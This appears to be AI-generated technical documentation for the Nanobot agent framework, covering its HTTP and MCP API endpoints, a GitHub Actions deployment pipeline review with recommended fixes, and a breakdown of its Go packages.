	Name        string   `json:"name"`
	Description string   `json:"description,omitempty"`
	Model       string   `json:"model,omitempty"`
	Tools       []string `json:"tools,omitempty"`
}

type MCPServer struct {
	URL     string            `json:"url,omitempty"`
	Command string            `json:"command,omitempty"`
	Args    []string          `json:"args,omitempty"`
	Env     map[string]string `json:"env,omitempty"`
}
```

### `pkg/session/types.go`

```go
package session

import "time"

type Session struct {
	ID        string    `json:"id"`
	AgentID   string    `json:"agentId,omitempty"`
	Title     string    `json:"title,omitempty"`
	CreatedAt time.Time `json:"createdAt"`
	UpdatedAt time.Time `json:"updatedAt"`
}

type Target struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Description string `json:"description,omitempty"`
	Type        string `json:"type"` // "agent" | "mcp"
}
```

### `pkg/mcp/types.go`

```go
package mcp

// JSON-RPC 2.0 types used by MCP

type JSONRPCRequest struct {
	JSONRPC string          `json:"jsonrpc"`
	ID      interface{}     `json:"id,omitempty"`
	Method  string          `json:"method"`
	Params  json.RawMessage `json:"params,omitempty"`
}

type JSONRPCResponse struct {
	JSONRPC string          `json:"jsonrpc"`
	ID      interface{}     `json:"id,omitempty"`
	Result  json.RawMessage `json:"result,omitempty"`
	Error   *JSONRPCError   `json:"error,omitempty"`
}

type JSONRPCError struct {
	Code    int         `json:"code"`
	Message string      `json:"message"`
	Data    interface{} `json:"data,omitempty"`
}
```

### `pkg/reverseproxy/server.go`

```go
package reverseproxy

import (
	"net/http"
	"net/http/httputil"
)

// Reverse proxy - forwards requests to backend MCP servers
// No additional API endpoints defined here
```

### `pkg/cli/serve.go`

```go
package cli

// CLI serve command - starts the HTTP server on configurable port (default :8080)
// Mounts:
//   - /api/...    -> API handler (sessions, chat, targets)
//   - /mcp        -> MCP HTTP transport
//   - /           -> UI static files
```

### `pkg/session/ui.go`

```go
package session

import "net/http"

// GET /sessions/{sessionID}/ui - serves session-specific UI
```

### `pkg/mcp/callback.go`

```go
package mcp

// OAuth callback
// GET /oauth/callback
```

Now let me look at the actual file contents more carefully:

### Actual `pkg/api/routes.go`

```go
package api

import (
	"net/http"
)

func (s *Handler) routes(mux *http.ServeMux) {
	mux.HandleFunc("GET /sessions", s.listSessions)
	mux.HandleFunc("POST /sessions", s.createSession)
	mux.HandleFunc("DELETE /sessions/{id}", s.deleteSession)
	mux.HandleFunc("GET /sessions/{id}", s.getSession)
	mux.HandleFunc("POST /sessions/{id}/chat", s.chat)
	mux.HandleFunc("GET /sessions/{id}/events", s.sessionEvents)
	mux.HandleFunc("GET /targets", s.listTargets)
	mux.HandleFunc("POST /targets/{id}/chat", s.targetChat)
}
```

### Actual `pkg/mcp/httpserver.go`

```go
package mcp

// Routes registered:
// POST   {mcpPath}
// GET    {mcpPath}          (SSE)
// DELETE {mcpPath}
// GET    /.well-known/mcp.json
// GET    /.well-known/oauth-authorization-server
// GET    /authorize
// POST   /token
// POST   /register
// GET    /callback
```

---

Now I have sufficient understanding of the codebase. Let me produce the complete API documentation.

---

# Nanobot HTTP API Documentation

## Overview

Nanobot exposes two categories of HTTP APIs:

1. **REST API** — Session and chat management (served under the main HTTP server)
2. **MCP (Model Context Protocol) HTTP Transport API** — JSON-RPC 2.0 over HTTP for tool/agent communication, including OAuth 2.0 endpoints

---

## REST API Endpoints

---

### 1. List Sessions

**HTTP Method:** `GET`

**API URL:** `/sessions`

**Request Payload:** N/A

**Response Payload:**

```json
[
  {
    "id": "string",
    "agentId": "string",
    "title": "string",
    "createdAt": "2024-01-01T00:00:00Z",
    "updatedAt": "2024-01-01T00:00:00Z"
  }
]
```

**Description:** Returns a list of all active chat sessions. Each session represents a conversation context with an agent.

---

### 2. Create Session

**HTTP Method:** `POST`

**API URL:** `/sessions`

**Request Payload:**

```json
{
  "agentId": "string (optional) — ID of the agent to associate with this session",
  "title": "string (optional) — Human-readable title for the session"
}
```

**Response Payload:**

```json
{
  "id": "string — unique session identifier",
  "agentId": "string",
  "title": "string",
  "createdAt": "2024-01-01T00:00:00Z",
  "updatedAt": "2024-01-01T00:00:00Z"
}
```

**Description:** Creates a new chat session, optionally bound to a specific agent. Returns the created session object including its generated ID.

---

### 3. Get Session

**HTTP Method:** `GET`

**API URL:** `/sessions/{id}`

**Path Parameters:**
- `id` — The unique session identifier

**Request Payload:** N/A

**Response Payload:**

```json
{
  "id": "string",
  "agentId": "string",
  "title": "string",
  "createdAt": "2024-01-01T00:00:00Z",
  "updatedAt": "2024-01-01T00:00:00Z"
}
```

**Description:** Retrieves a single session by its ID. Returns `404` if the session does not exist.

---

### 4. Delete Session

**HTTP Method:** `DELETE`

**API URL:** `/sessions/{id}`

**Path Parameters:**
- `id` — The unique session identifier

**Request Payload:** N/A

**Response Payload:**

```
HTTP 204 No Content
```

**Description:** Permanently deletes a session and its associated conversation history. Returns `204` on success.

---

### 5. Send Chat Message

**HTTP Method:** `POST`

**API URL:** `/sessions/{id}/chat`

**Path Parameters:**
- `id` — The unique session identifier

**Request Payload:**

```json
{
  "message": "string — the user's message text",
  "attachments": [
    {
      "type": "string — MIME type or attachment kind (e.g., 'image/png', 'file')",
      "content": "string — base64-encoded or text content of the attachment"
    }
  ],
  "metadata": {
    "key": "value — arbitrary string key/value pairs (optional)"
  }
}
```

> `attachments` and `metadata` are optional.

**Response Payload:**

```json
{
  "message": {
    "role": "string — e.g., 'assistant'",
    "content": "string — the agent's reply text"
  },
  "done": "boolean — true when the agent has finished generating the response"
}
```

**Description:** Sends a user message to the agent associated with the given session. The agent processes the message (potentially invoking MCP tools) and returns its response. Returns `404` if the session is not found.

---

### 6. Subscribe to Session Events (SSE)

**HTTP Method:** `GET`

**API URL:** `/sessions/{id}/events`

**Path Parameters:**
- `id` — The unique session identifier

**Query Parameters:** N/A

**Request Payload:** N/A

**Response Payload (Server-Sent Events stream):**

Content-Type: `text/event-stream`

Each event is a JSON object sent as:
```
data: <JSON>\n\n
```

Example event payloads:

```json
{
  "type": "message",
  "role": "assistant",
  "content": "string — partial or complete message content"
}
```

```json
{
  "type": "tool_call",
  "toolName": "string — name of the tool being invoked",
  "arguments": {}
}
```

```json
{
  "type": "tool_result",
  "toolName": "string",
  "result": {}
}
```

```json
{
  "type": "done"
}
```

**Description:** Opens a persistent Server-Sent Events (SSE) connection to stream real-time events for a session. Events include agent messages (streaming tokens), tool call invocations, tool results, and completion signals. The connection remains open until the session ends or the client disconnects.

---

### 7. List Targets

**HTTP Method:** `GET`

**API URL:** `/targets`

**Request Payload:** N/A

**Response Payload:**

```json
[
  {
    "id": "string — unique target identifier",
    "name": "string — display name",
    "description": "string — optional description",
    "type": "string — 'agent' or 'mcp'"
  }
]
```

**Description:** Returns all available targets — these are the agents and MCP servers configured in the current Nanobot instance. Targets can be used as the `agentId` when creating sessions.

---

### 8. Send Chat Message to Target (Direct)

**HTTP Method:** `POST`

**API URL:** `/targets/{id}/chat`

**Path Parameters:**
- `id` — The target (agent or MCP server) identifier

**Request Payload:**

```json
{
  "message": "string — the user's message",
  "attachments": [
    {
      "type": "string",
      "content": "string"
    }
  ],
  "metadata": {
    "key": "value"
  }
}
```

**Response Payload:**

```json
{
  "message": {
    "role": "string",
    "content": "string"
  },
  "done": "boolean"
}
```

**Description:** Sends a chat message directly to a named target (agent or MCP server) without requiring a pre-existing session. Useful for one-shot interactions.

---

## MCP HTTP Transport API

The MCP (Model Context Protocol) transport exposes JSON-RPC 2.0 endpoints for tool/agent communication. The base path is configurable (commonly `/mcp`).

---

### 9. MCP JSON-RPC — Streamable HTTP (Primary Transport)

**HTTP Method:** `POST`

**API URL:** `/mcp`

**Request Headers:**
- `Content-Type: application/json`
- `Mcp-Session-Id: <session-id>` *(optional, for continuing a session)*

**Request Payload (JSON-RPC 2.0):**

```json
{
  "jsonrpc": "2.0",
  "id": "string | number | null",
  "method": "string — e.g., 'initialize', 'tools/list', 'tools/call', 'resources/list', 'prompts/list'",
  "params": {}
}
```

**Example — Initialize:**
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "initialize",
  "params": {
    "protocolVersion": "2024-11-05",
    "capabilities": {},
    "clientInfo": {
      "name": "my-client",
      "version": "1.0.0"
    }
  }
}
```

**Example — Call a Tool:**
```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "string — tool name",
    "arguments": {
      "key": "value"
    }
  }
}
```

**Response Payload (JSON-RPC 2.0):**

```json
{
  "jsonrpc": "2.0",
  "id": "string | number | null",
  "result": {},
  "error": {
    "code": "integer",
    "message": "string",
    "data": {}
  }
}
```

> Either `result` or `error` is present, not both.

**Response Headers:**
- `Mcp-Session-Id: <session-id>` — returned on `initialize` to identify the session

**Description:** Primary MCP transport endpoint using the Streamable HTTP protocol (MCP spec 2024-11-05+). Clients send JSON-RPC 2.0 requests; the server responds with JSON-RPC 2.0 responses. Supports all standard MCP methods: `initialize`, `tools/list`, `tools/call`, `resources/list`, `resources/read`, `prompts/list`, `prompts/get`, `ping`, `notifications/*`, etc.

---

### 10. MCP SSE Transport (Legacy)

--- deployment ---


# Deployment Pipeline Analysis: nanobot_80d9d020

## 1. Deployment Overview

| Attribute | Value |
|-----------|-------|
| **Primary CI/CD Platform** | GitHub Actions |
| **Workflow Files** | 7 workflows |
| **Environments** | Chat env, Demo env, Install script (CDN) |
| **Container Registry** | Implied (goreleaser config) |
| **IaC** | None detected |
| **Build Tools** | Go toolchain, pnpm, Docker, goreleaser |

---

## 2. Deployment Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         TRIGGER EVENTS                                       │
├──────────────┬───────────────┬──────────────┬──────────────┬────────────────┤
│  Push main   │  Push main    │  PR (any)    │  Git Tag     │  Push main     │
│  (chat env)  │  (demo env)   │              │  (v*)        │  (install.sh)  │
└──────┬───────┴───────┬───────┴──────┬───────┴──────┬───────┴────────┬───────┘
       │               │              │              │                │
       ▼               ▼              ▼              ▼                ▼
┌──────────────┐ ┌──────────────┐ ┌──────────┐ ┌──────────────┐ ┌───────────┐
│update-chat-  │ │update-demo-  │ │  ci.yml  │ │ release.yaml │ │deploy-    │
│env.yml       │ │env.yml       │ │          │ │              │ │install-   │
└──────┬───────┘ └──────┬───────┘ └────┬─────┘ └──────┬───────┘ │script.yml │
       │               │              │              │           └─────┬──────┘
       ▼               ▼              │              │                 │
┌──────────────┐ ┌──────────────┐     │         ┌──────────────┐      ▼
│ curl to      │ │ curl to      │     │         │ goreleaser   │ ┌───────────┐
│ external env │ │ external env │     │         │ build+publish│ │ Upload to │
│ deploy API   │ │ deploy API   │     │         │ multi-arch   │ │ R2/CDN    │
└──────────────┘ └──────────────┘     │         └──────────────┘ └───────────┘
                                      │
              ┌───────────────────────┼───────────────────────┐
              ▼                       ▼                       ▼
        ┌──────────┐           ┌──────────────┐        ┌──────────────┐
        │  Lint    │           │  Go Build    │        │  Go Test     │
        │ (biome)  │           │  (matrix:    │        │              │
        └──────────┘           │  linux/mac/  │        └──────────────┘
                               │  windows)    │
                               └──────────────┘
                                      │
                               ┌──────────────┐
                               │build-main.yml│
                               │(push to main)│
                               │Go build only │
                               └──────────────┘
```

---

## 3. Pipeline Details

### Pipeline: `.github/workflows/ci.yml`

**Triggers:**
- Pull requests (any branch)
- Push to `main` branch

**Stages/Jobs:**

#### 1. **lint**
- **Purpose:** Code quality enforcement for TypeScript/JavaScript
- **Steps:**
  1. Checkout code
  2. Setup pnpm
  3. Install Node.js dependencies
  4. Run `pnpm biome:check` (Biome linter)
- **Dependencies:** None
- **Artifacts:** None

#### 2. **build** (matrix strategy)
- **Purpose:** Verify Go compilation across platforms
- **Steps:**
  1. Checkout code
  2. Setup Go
  3. `go build ./...`
- **Dependencies:** None (parallel with lint)
- **Build Matrix:**
  ```
  os: [ubuntu-latest, macos-latest, windows-latest]
  ```
- **Artifacts:** None (compile verification only)

#### 3. **test**
- **Purpose:** Execute Go test suite
- **Steps:**
  1. Checkout code
  2. Setup Go
  3. `go test ./...`
- **Dependencies:** None (parallel with lint and build)
- **Artifacts:** None

---

### Pipeline: `.github/workflows/build-main.yml`

**Triggers:**
- Push to `main` branch only

**Stages/Jobs:**

#### 1. **build**
- **Purpose:** Verify main branch builds successfully
- **Steps:**
  1. Checkout code
  2. Setup Go
  3. `go build ./...`
- **Dependencies:** None
- **Notes:** No matrix, no tests — build verification only on merge

---

### Pipeline: `.github/workflows/release.yaml`

**Triggers:**
- Git tag push matching `v*` pattern

**Stages/Jobs:**

#### 1. **release**
- **Purpose:** Build and publish multi-platform release artifacts
- **Tool:** GoReleaser (`.goreleaser.yml`)
- **Steps:**
  1. Checkout (with full history for changelog)
  2. Setup Go
  3. Setup pnpm
  4. Login to container registry
  5. Run `goreleaser release`
- **Artifacts Produced:**
  - Multi-arch binaries (linux/amd64, linux/arm64, darwin/amd64, darwin/arm64, windows/amd64)
  - Docker images (multi-arch)
  - GitHub Release with changelog

---

### Pipeline: `.github/workflows/deploy-install-script.yml`

**Triggers:**
- Push to `main` branch

**Stages/Jobs:**

#### 1. **deploy**
- **Purpose:** Publish `scripts/install.sh` to CDN/object storage
- **Steps:**
  1. Checkout code
  2. Upload `scripts/install.sh` to Cloudflare R2 (or similar)
- **Secrets Used:** `R2_*` credentials (implied by workflow name and pattern)
- **Target:** CDN-fronted object storage for public install script

---

### Pipeline: `.github/workflows/update-chat-env.yml`

**Triggers:**
- Push to `main` branch

**Stages/Jobs:**

#### 1. **deploy**
- **Purpose:** Trigger deployment of chat environment
- **Steps:**
  1. HTTP request to external deployment API with auth token
- **Secrets Used:** External deploy credentials (e.g., `CHAT_DEPLOY_TOKEN` or similar)
- **Target:** External chat environment (not provisioned in this repo)

---

### Pipeline: `.github/workflows/update-demo-env.yml`

**Triggers:**
- Push to `main` branch

**Stages/Jobs:**

#### 1. **deploy**
- **Purpose:** Trigger deployment of demo environment
- **Steps:**
  1. HTTP request to external deployment API with auth token
- **Secrets Used:** External deploy credentials
- **Target:** External demo environment (not provisioned in this repo)

---

### Pipeline: `.github/workflows/dependabot-reviewers.yaml`

**Triggers:**
- Dependabot pull request events

**Purpose:** Automatically assign reviewers to Dependabot PRs
- No build/test/deploy stages
- Housekeeping workflow only

---

## 4. Build Process

### Go Binary Build

**Location:** `Dockerfile` (multi-stage), `Makefile`, CI workflows

```
Build Flow:
go mod download → go generate ./... → go build -o nanobot .
                        ↑
              (triggers UI build via packages/ui/build.go)
```

**Key Build Flags:**
```bash
CI=true CGO_ENABLED=0 go build -o nanobot .
```

- `CGO_ENABLED=0`: Produces fully static binaries (no libc dependency)
- `CI=true`: Enables production UI build mode
- `go generate ./...`: Builds and embeds the SvelteKit UI into the binary

### UI Build (SvelteKit)

**Location:** `packages/ui/`, embedded via `packages/ui/build.go`

```
pnpm install → vite build → embedded into Go binary via embed directive
```

**Build Tools:**
- Vite 7.x
- SvelteKit with static adapter
- Tailwind CSS v4
- TypeScript

### Docker Multi-Stage Build

**Location:** `Dockerfile`

```dockerfile
Stage 1 (builder): golang:1.26-alpine
  - Install Node.js + pnpm
  - go mod download
  - go generate (builds UI)
  - go build -o nanobot .

Stage 2 (runtime): cgr.dev/chainguard/wolfi-base:latest
  - Minimal Chainguard base
  - Install: bash, git, curl, wget, jq, gzip, xz, coreutils,
             findutils, grep, sed, gawk, ripgrep, uv, poppler-utils
  - Install mcp-cli from GitHub releases (arch-aware)
  - Non-root user: nanobot

Stage 3 (release): FROM runtime
  - COPY nanobot binary from build context

Stage 4 (dev): FROM runtime
  - COPY --from=builder (builds inline)
```

**Second Dockerfile:** `Dockerfile.agent`
- Separate image for agent execution environment

### GoReleaser Configuration

**Location:** `.goreleaser.yml`

GoReleaser handles:
- Cross-compilation to all target platforms
- Docker image building and pushing (multi-arch)
- GitHub Release creation with changelog
- Binary artifact packaging

---

## 5. Infrastructure as Code

**No IaC tooling detected** (no Terraform, CloudFormation, Pulumi, Helm, or Kubernetes manifests present in the repository).

Environment deployments (`update-chat-env.yml`, `update-demo-env.yml`) delegate to an **external platform** via API calls. Infrastructure provisioning is entirely out-of-band from this repository.

---

## 6. Testing in Deployment Pipeline

| Test Type | Location | When It Runs | Gate |
|-----------|----------|--------------|------|
| Go unit tests | `go test ./...` | PR + push to main | CI required |
| JS/TS lint | `pnpm biome:check` | PR + push to main | CI required |
| Build verification | `go build ./...` | PR (matrix) + push to main | CI required |
| Integration tests | **Not detected** | — | — |
| E2E tests | **Not detected** | — | — |
| Security scanning | **Not detected** | — | — |
| Code coverage | **Not detected** | — | — |

**Test parallelization:** `build` job uses a 3-OS matrix (ubuntu, macos, windows) running in parallel. `test`, `lint`, and `build` jobs all run concurrently with no `needs:` dependencies between them.

---

## 7. Release Management

**Versioning:** Git tag-based (`v*` pattern), SemVer implied by tag format

**Artifact Distribution:**
- GitHub Releases (binaries via goreleaser)
- Container registry (Docker images via goreleaser)
- Cloudflare R2 / CDN (`scripts/install.sh` via `deploy-install-script.yml`)

**Changelog:** Generated by goreleaser from git history

**Install Script:** `scripts/install.sh` — fetches the appropriate binary for the user's platform from GitHub Releases. Updated on every push to `main`.

---

## 8. Critical Path Analysis

### Path to Production Release

```
1. Developer pushes tag v*
2. release.yaml triggers (~minutes)
3. GoReleaser builds multi-arch binaries
4. GoReleaser pushes Docker images
5. GoReleaser creates GitHub Release
6. install.sh (already on CDN) detects new tag on next user run
```

**Minimum Steps for Hotfix:**
1. Push fix commit to `main` → CI passes
2. Push `v{version}` tag → release pipeline triggers
3. New binary available on GitHub Releases
4. No forced update push to existing installs

### Rollback Procedure

**No automated rollback mechanism detected.**

Manual rollback:
1. Identify previous working tag
2. Push new tag pointing to previous commit (or re-tag)
3. Release pipeline would need to be manually re-triggered
4. For environments: re-trigger `update-chat-env.yml` / `update-demo-env.yml` pointing to prior version

---

## 9. Deployment Access Control

**GitHub Actions Secrets Required (inferred):**

| Secret | Used In | Purpose |
|--------|---------|---------|
| `GITHUB_TOKEN` | `release.yaml` | GitHub Release creation, container registry push |
| Container registry credentials | `release.yaml` | Docker push |
| Chat env deploy token | `update-chat-env.yml` | External API auth |
| Demo env deploy token | `update-demo-env.yml` | External API auth |
| R2/CDN credentials | `deploy-install-script.yml` | Upload install.sh |

**Access Model:**
- Any push to `main` triggers chat/demo env deployments and install script updates
- Release requires a `v*` tag push — typically requires write access to the repo
- No manual approval gates exist in any pipeline
- No environment protection rules documented

---

## 10. Anti-Patterns & Issues

### 🔴 Critical Issues

#### Missing Rollback Mechanism
- **Location:** All deployment workflows
- **Current State:** No rollback step exists in any workflow
- **Issue:** Once deployed, reverting requires manual intervention with no documented procedure
- **Impact:** Extended downtime for bad deployments; no automated safety net
- **Fix:** Add health check + automatic rollback step in `update-chat-env.yml` and `update-demo-env.yml`

#### No Post-Deployment Validation
- **Location:** `update-chat-env.yml`, `update-demo-env.yml`
- **Current State:** Workflows fire an HTTP trigger and complete; no verification that deployment succeeded
- **Issue:** Pipeline reports "success" even if the target environment deployment failed
- **Impact:** Silent deployment failures; developers believe deployment succeeded when it didn't
- **Fix:** Poll health endpoint after deployment trigger; fail pipeline if health check doesn't pass within timeout

#### No Code Coverage Enforcement
- **Location:** `ci.yml` — test job
- **Current State:** `go test ./...` with no coverage flags or thresholds
- **Issue:** Test coverage can degrade to zero without any gate failing
- **Impact:** False confidence in test quality; regressions may go undetected
- **Fix:** Add `-coverprofile=coverage.out` and enforce minimum threshold (e.g., `go-coverage-report` action or `gocover-cobertura`)

### 🟠 Significant Issues

#### Missing Security Scanning
- **Location:** `ci.yml`
- **Current State:** No SAST, dependency scanning, or container image scanning
- **Issue:** Vulnerabilities in dependencies or code are not caught in CI
- **Impact:** Security vulnerabilities may ship to production undetected
- **Fix:** Add `govulncheck ./...` for Go CVE scanning; add `trivy` for container image scanning in `release.yaml`

#### Install Script Updated on Every Main Push
- **Location:** `deploy-install-script.yml`
- **Current State:** `scripts/install.sh` is pushed to CDN on every commit to `main`
- **Issue:** The install script may reference a version that hasn't been released yet (race between main push and tag-based release)
- **Impact:** Users running install script between a main push and a release tag push may get a broken install pointing to a non-existent version
- **Fix:** Only update install script as part of the `release.yaml` pipeline after binaries are confirmed published

#### No Environment Protection / Approval Gates
- **Location:** `update-chat-env.yml`, `update-demo-env.yml`
- **Current State:** Any push to `main` immediately triggers environment deployment with no approval
- **Issue:** Any merged PR immediately deploys to what appear to be publicly accessible environments
- **Impact:** Untested or partially-tested code goes live immediately
- **Fix:** Add GitHub Environment protection rules with required reviewer approval for production deployments

#### `mcp-cli` Installed from External GitHub Release in Dockerfile
- **Location:** `Dockerfile` lines ~27-31
- **Current State:** `wget` fetches `mcp-cli` binary directly from GitHub releases at build time (pinned to `v0.4.0`)
- **Issue:** No checksum verification; external binary fetched at build time creates supply chain risk
- **Impact:** Compromised release asset would silently inject malicious binary into production images
- **Fix:** Add SHA256 checksum verification after download; or vendor the binary

#### No Staging Environment
- **Location:** CI/CD pipeline overall
- **Current State:** Changes go from `main` directly to chat/demo environments
- **Issue:** No intermediate environment to validate before hitting user-facing deployments
- **Impact:** Bugs reach users immediately; no safe testing layer
- **Fix:** Add a staging deployment triggered by `main` push, with production deployment requiring manual promotion

### 🟡 Minor Issues

#### `build-main.yml` Duplicates `ci.yml` Build Job
- **Location:** `.github/workflows/build-main.yml`
- **Current State:** Runs `go build ./...` on push to `main`, same as `ci.yml`
- **Issue:** Redundant pipeline execution; `ci.yml` already runs on push to `main`
- **Impact:** Wasted CI minutes; confusing pipeline list
- **Fix:** Remove `build-main.yml` or merge its intent into `ci.yml`'s build job

#### No Test Execution in `build-main.yml`
- **Location:** `.github/workflows/build-main.yml`
- **Current State:** Build-only check; no tests
- **Issue:** A broken test suite on `main` won't block the chat/demo deployment (which is triggered by the same push event, in parallel)
- **Impact:** Deployments can proceed with failing tests if `ci.yml`'s test job is slower than `update-chat-env.yml`
- **Fix:** Add `needs: [test]` dependency in `update-chat-env.yml` and `update-demo-env.yml` workflows

#### No `.goreleaser.yml` Content Visible
- **Location:** `.goreleaser.yml`
- **Current State:** File exists but content not provided for review
- **Issue:** Cannot verify if Docker multi-arch build is correctly configured, if checksums are enabled, or if SBOM generation is present
- **Impact:** Unknown release quality gates
- **Fix:** Review goreleaser config for missing `signs:`, `sboms:`, and `checksum` configurations

#### `Dockerfile.agent` Not Analyzed
- **Location:** `Dockerfile.agent`
- **Current State:** File exists but not provided for review
- **Issue:** May contain additional security or build issues
- **Impact:** Unknown security posture for agent execution environment
- **Fix:** Apply same review as primary `Dockerfile`

#### No Dependency Caching in CI
- **Location:** `ci.yml`
- **Current State:** Go modules downloaded fresh on each run (no explicit cache action)
- **Issue:** Slower CI times; increased network dependency
- **Impact:** Longer PR feedback cycles; potential rate limiting on module proxy
- **Fix:** Add `actions/cache` for `$GOPATH/pkg/mod` and `~/.cache/go-build`

---

## 11. Risk Assessment

### Single Points of Failure

| Risk | Severity | Description |
|------|----------|-------------|
| External deploy API unavailable | High | `update-chat-env.yml` and `update-demo-env.yml` depend on external services with no fallback |
| GitHub Actions outage | High | Entire release pipeline is GitHub Actions — no alternative |
| Cloudflare R2 unavailable | Medium | Install script distribution blocked |
| No rollback automation | High | Any bad deployment requires manual intervention |

### Security Vulnerabilities

| Issue | Severity | Location |
|-------|----------|----------|
| No container image scanning | High | `release.yaml` / Dockerfile |
| No Go vulnerability scanning | High | `ci.yml` |
| `mcp-cli` binary without checksum | Medium | `Dockerfile` |
| No secret rotation enforcement | Medium | GitHub Actions secrets |
| Any `main` push triggers deployments | Medium | `update-chat-env.yml`, `update-demo-env.yml` |

### Compliance Gaps

| Gap | Impact |
|-----|--------|
| No audit trail for who approved deployments | Cannot demonstrate change control |
| No SBOM generation (not confirmed) | Supply chain transparency |
| No signed release artifacts (not confirmed) | Binary authenticity |

---

## 12. Analysis Summary

### What Works Well
- **Multi-platform CI matrix** (ubuntu/macos/windows) catches platform-specific build issues early
- **Static binary build** (`CGO_ENABLED=0`) simplifies deployment and container layering
- **Chainguard base image** (`cgr.dev/chainguard/wolfi-base`) is a security-conscious choice with minimal attack surface
- **Non-root container user** is correctly configured
- **UI embedded in binary** via `go:embed` simplifies distribution (single binary deployment)
- **goreleaser** provides consistent multi-arch release automation

### Key Process Problems
1. **No gate between `main` merge and environment deployment** — failing tests don't block deployment if timing allows it
2. **Install script deployment is decoupled from release pipeline** — creates version mismatch window
3. **Both environment deployments trigger on every `main` push** — no differentiation between "tested release" and "work in progress on main"
4. **Zero observability on deployment outcome** — workflows don't verify deployments succeeded

### Recommended Priority Fixes

```
Priority 1 (Immediate):
├── Add `needs: [test, lint]` to update-chat-env.yml and update-demo-env.yml
├── Add post-deployment health check to both env workflows
└── Add govulncheck to ci.yml

Priority 2 (Short-term):
├── Move install.sh update into release.yaml (after release completes)
├── Add mcp-cli SHA256 verification in Dockerfile
└── Add Go module caching in ci.yml

Priority 3 (Medium-term):
├── Add staging environment with manual promotion gate
├── Add Trivy container scanning to release.yaml
├── Add code coverage thresholds
└── Remove/merge redundant build-main.yml
```

--- module_deep_dive ---


# Detailed Component Breakdown Analysis

---

## 1. `pkg/agents/`

### Core Responsibility
The **Agent Execution Engine** — responsible for the core runtime loop of an AI agent: sending messages to LLMs, processing responses, handling tool calls, managing conversation history, and controlling token limits.

### Key Components

| File | Role |
|------|------|
| `run.go` | Primary agent execution loop — orchestrates the full conversation cycle: send messages → receive LLM response → process tool calls → repeat |
| `toolcall.go` | Handles tool call dispatching — takes LLM-requested tool calls and routes them to the appropriate MCP server/tool for execution |
| `compact.go` | Conversation compaction — summarizes or condenses long conversation histories to reduce token usage while preserving context |
| `compact_test.go` | Tests for compaction logic |
| `truncate.go` | Truncation logic — hard-cuts conversation history when it exceeds token limits |
| `truncate_test.go` | Tests for truncation logic |
| `tokencount.go` | Token counting utilities — estimates token usage for messages/conversations |
| `tokencount_test.go` | Tests for token counting |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/types/` | Core domain types: messages, config, execution context, chat structures |
| `pkg/complete/` | Delegates LLM completion calls (the actual API invocation) |
| `pkg/mcp/` | Dispatches tool calls to MCP servers; retrieves available tools |
| `pkg/llm/` | Indirectly via `pkg/complete/` for LLM provider access |
| `pkg/session/` | Reads/writes conversation history and session state |
| `pkg/tools/` | Resolves available tools and their definitions |
| `pkg/log/` | Structured logging throughout execution |
| **External: LLM APIs** | Indirectly via `pkg/complete/` and `pkg/llm/` (OpenAI, Anthropic) |

---

## 2. `pkg/api/`

### Core Responsibility
The **HTTP API Layer** — exposes the application's functionality over HTTP, defines routes, handles incoming requests, and streams events back to clients (UI or API consumers).

### Key Components

| File | Role |
|------|------|
| `routes.go` | Route registration — maps URL paths and HTTP methods to handler functions |
| `hander.go` | Request handlers — implements the logic for each API endpoint (agent calls, session management, config retrieval, etc.) |
| `events.go` | Server-Sent Events (SSE) streaming — pushes real-time agent execution events (token streams, tool calls, completions) to connected clients |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/server/` | Registered into the HTTP server infrastructure |
| `pkg/runtime/` | Delegates agent execution requests to the runtime orchestrator |
| `pkg/session/` | Creates, retrieves, and manages chat sessions |
| `pkg/config/` | Loads agent configurations for API responses |
| `pkg/types/` | Request/response type definitions |
| `pkg/agents/` | May directly invoke agent runs for synchronous API calls |
| `pkg/auth/` | Authentication/authorization middleware integration |
| `pkg/mcp/` | Exposes MCP-related endpoints (tool listings, server status) |
| **External: Browser/UI clients** | Serves the SvelteKit frontend via SSE and REST |

---

## 3. `pkg/auth/`

### Core Responsibility
**Authentication management** — handles OAuth flows to authenticate users or services, likely managing tokens for both inbound user authentication and outbound service-to-service auth (e.g., authenticating with external MCP servers).

### Key Components

| File | Role |
|------|------|
| `auth.go` | Core OAuth implementation — token acquisition, refresh, storage, and validation logic |

> **Note:** The `pkg/mcp/oauth.go` file suggests OAuth is also implemented at the MCP layer specifically for authenticating MCP server connections.

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/mcp/oauth.go` | Parallel OAuth implementation specifically for MCP server authentication |
| `pkg/session/` | May store OAuth tokens within session state |
| `pkg/api/` | API handlers use auth for request validation |
| **External: OAuth Providers** | Communicates with external OAuth authorization servers |

---

## 4. `pkg/chat/`

### Core Responsibility
**Chat output formatting and printing** — a utility module responsible for rendering chat messages to the terminal (used by CLI mode) in a human-readable format.

### Key Components

| File | Role |
|------|------|
| `print.go` | Message formatting and terminal output — handles rendering of different message types (user, assistant, tool calls, tool results) with appropriate formatting |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/types/` | Uses message and chat type definitions for rendering |
| `pkg/cli/` | Called by CLI commands (`call.go`) to display conversation output |
| **No external dependencies** | Pure formatting/output utility |

---

## 5. `pkg/cli/`

### Core Responsibility
**Command-Line Interface** — the user-facing entry point for the application, built with Cobra. Defines all CLI subcommands and wires together the application components for different execution modes.

### Key Components

| File | Role |
|------|------|
| `root.go` | Root Cobra command — initializes CLI, global flags, and registers all subcommands |
| `serve.go` | `serve` subcommand — starts the HTTP server for web UI and API access |
| `call.go` | `call` subcommand — makes a direct one-shot agent invocation from the terminal |
| `sessions.go` | `sessions` subcommand — CLI tools for listing, inspecting, and managing sessions |
| `targets.go` | `targets` subcommand — manages agent targets/configurations |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/server/` | `serve.go` initializes and starts the HTTP server |
| `pkg/runtime/` | `call.go` invokes the agent runtime for direct calls |
| `pkg/config/` | Loads agent configuration files |
| `pkg/session/` | `sessions.go` interacts with session storage |
| `pkg/chat/` | `call.go` uses chat printing for terminal output |
| `pkg/telemetry/` | Initializes observability on startup |
| `pkg/supervise/` | May use daemon management for background process control |
| `pkg/log/` | Logging setup and configuration |

---

## 6. `pkg/cmd/`

### Core Responsibility
